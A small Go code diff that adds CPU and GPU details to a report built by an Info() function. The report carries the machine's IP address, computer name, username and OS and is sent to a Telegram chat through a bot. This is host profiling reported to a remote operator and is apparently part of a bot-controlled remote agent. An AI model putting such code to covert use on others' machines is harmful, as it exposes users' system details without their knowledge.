@@ -15,7 +15,7 @@ import (
 
 const (
 	fmtInfo = "```\nIP Address: %s\nComputer name: %s\nUsername: [%s] %s\nOperating System: %s %s\n" +
-		"```"
+		"CPU: %s\nGPU: %s```"
 )
 
 func Info() {
@@ -33,7 +33,9 @@ func Info() {
 		util.ChatID,
 		fmt.Sprintf(
 			fmtInfo, ip, host, usr.Name, usr.Username,
-			runtime.GOOS, runtime.GOARCH),
+			runtime.GOOS, runtime.GOARCH, util.CPUInfo(),
+			util.GPUInfo(),
+		),
 	)
 	cfg.ParseMode = "Markdown"
 	api.Bot.Send(cfg)
